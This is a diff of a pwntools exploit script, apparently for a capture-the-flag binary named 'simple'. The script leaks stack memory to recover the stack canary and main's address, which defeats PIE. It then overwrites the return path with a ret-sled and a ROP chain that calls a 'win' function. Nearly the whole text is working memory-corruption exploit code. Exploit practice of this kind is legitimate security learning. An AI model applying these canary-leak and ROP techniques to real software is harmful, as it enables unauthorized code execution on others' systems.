@@ -8,37 +8,31 @@ except:
 context.binary = elf = ELF("./simple")
 context.log_level = "warning"
 
-# io = process()
-# io.sendline(cyclic(0x256, n=8))
-# io.sendline(b"quit")
-# io.wait()
-# offset = cyclic_find(io.corefile.fault_addr, n=8)
-# io.close()
-# print(stack_buf_size)
-# assert stack_buf_size != -1
+io = process()
+# gdb.attach(io.pid)
+io.sendlineafter(b"? ", b"r")
+io.sendlineafter(b"? ", b"512") # 512 < 0x256
 
-for offset1 in tqdm(range(8)): # stack_buf_size between stack buffer and canary
-    for offset2 in range(8): # stack_buf_size between stack canary and return address
-        stack_buf_size = 0x100
+leak = io.read(512)
+ptrs = [unpack(leak[i:i+8]) for i in range(0, len(leak), 8)]
+main_addr, main_addr_idx = [(ptr, i) for i, ptr in enumerate(ptrs) if 0x500000000000 < ptr < 0x600000000000 and ptr & 0xfff == elf.sym.main & 0xfff][0]
+print(hex(main_addr), main_addr_idx)
+canary_indices = [i for i, ptr in enumerate(ptrs) if all(byte != 0 for byte in (ptr >> 8).to_bytes(7)) and ptr & 0xff == 0]
+if len(canary_indices) < 1:
+    raise SystemExit(2)
+canary_idx = canary_indices[0]
 
-        with process() as io:
-            # gdb.attach(io.pid)
-            io.readuntil(b"> ")
-            io.send(b"A" * (stack_buf_size + offset1*8 + 1))
-            leak = io.readline()
-            canary = b"\0" + leak[len("Nice to meet you ") + stack_buf_size + offset1*8 + 1:][:7]
-            # print(f"{canary = }; {len(canary) = }")
-
-            rop = ROP(elf)
-            rop.call(elf.sym.win, [123, 321])
-            payload = b'A' * stack_buf_size + pack(0)*offset1 + canary + pack(0)*offset2 + rop.chain()
-
-            io.readuntil(b"> ")
-            io.send(payload)
-            io.readuntil(b"> ")
-            io.sendline(b"quit")
-
-            data = io.readall().decode('utf-8').strip()
-            if "stack smashing" in data or data == "":
-                continue
-            print(data)
+elf.address = main_addr - elf.sym.main
+rop = ROP(elf)
+rop.call(elf.sym.win, [123, 321])
+payload = list(leak)
+nop = pack(next(elf.search(asm("ret"))))
+chain = rop.chain()
+for i in range(canary_idx + 1, (512 - len(chain)) // 8):
+    chain = nop + chain
+payload[(canary_idx + 1) * 8:] = chain
+io.sendlineafter(b"? ", b"w")
+io.sendlineafter(b"? ", b"512")
+io.send(bytes(payload))
+io.sendlineafter(b"? ", b"q")
+print(io.readall(timeout=1).decode().rstrip())
